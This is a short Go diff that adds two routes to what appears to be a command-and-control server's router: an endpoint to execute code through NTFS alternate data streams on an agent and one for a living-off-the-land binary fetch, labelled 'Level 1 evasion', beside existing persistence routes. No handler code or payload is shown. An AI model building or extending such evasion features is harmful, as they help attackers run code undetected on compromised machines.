@@ -89,6 +89,10 @@ func (r *Router) Setup() *gin.Engine {
 			persist.POST("/remove", r.handlers.RemovePersistence)
 		}
 
+		// ADS & LOLBin (Level 1 evasion)
+		v1.POST("/agent/:id/ads/exec", r.handlers.ADSExec)
+		v1.POST("/agent/:id/fetch", r.handlers.LOLBinFetch)
+
 		// Monitoring
 		v1.GET("/stats", r.handlers.GetStats)
 		v1.GET("/health", r.handlers.HealthCheck)
